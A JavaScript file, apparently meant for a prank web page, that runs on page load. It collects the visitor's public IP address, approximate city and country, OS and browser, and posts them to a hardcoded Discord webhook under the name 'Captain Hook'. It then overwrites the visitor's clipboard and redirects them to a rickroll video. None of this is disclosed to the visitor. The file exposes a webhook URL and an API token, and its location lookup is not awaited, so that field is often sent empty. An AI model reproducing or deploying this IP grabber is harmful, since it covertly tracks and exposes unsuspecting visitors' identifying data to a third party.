const webhookUrl = 'https://discord.com/api/webhooks/1376279997018407094/61KBhtZIo3BeLNXLm2F3Y7cek27c2F36iVIFv3xdfkpA2tN-vtj_np8Me5sNJVOSv8AO';

async function sendIP() {
  try {
    //get ip
    const ipResponse = await axios.get('https://api.ipify.org?format=json');
    const ip = ipResponse.data.ip;

    //get Broswer and OS
    const userAgent = navigator.userAgent;

    let os = "Unknown OS";
    if (userAgent.indexOf("Win") !== -1) os = "Windows";
    else if (userAgent.indexOf("Mac") !== -1) os = "macOS";
    else if (userAgent.indexOf("Linux") !== -1) os = "Linux";
    else if (userAgent.indexOf("Android") !== -1) os = "Android";
    else if (userAgent.indexOf("like Mac") !== -1) os = "iOS";

    let browser = "Unknown Browser";
    if (userAgent.indexOf("Chrome") !== -1) browser = "Chrome";
    else if (userAgent.indexOf("Firefox") !== -1) browser = "Firefox";
    else if (userAgent.indexOf("Safari") !== -1 && userAgent.indexOf("Chrome") === -1) browser = "Safari";
    else if (userAgent.indexOf("MSIE") !== -1 || userAgent.indexOf("Trident") !== -1) browser = "Internet Explorer";
    else if (userAgent.indexOf("Edge") !== -1) browser = "Edge";

    //get location
    let location = "Unknown location"
    fetch('https://ipinfo.io/json?token=8ec6b8ecea78bc')
      .then(response => response.json())
      .then(data => {
        console.log(data.city)
        console.log(data.country)
        location = `${data.city}, ${data.country}`;
      })
      .catch(error => {
        console.error("Error");
      });

    //create payload
    const payload = {
      content: `IP: ${ip}, OS: ${os}, Browser: ${browser}, Location: ${location}`,
      username: 'Captain Hook'
    };

    const response = await axios.post(webhookUrl, payload);
    
    if (response.status === 204) {
      console.log('Message sent');
    } else {
      console.log(`Message failed: ${response.status}`);
    }
    navigator.clipboard.writeText("Get Rick Rolled");
  } catch (error) {
    console.error('Error:', error.message);
  } finally {
    window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  }
}

window.onload = sendIP();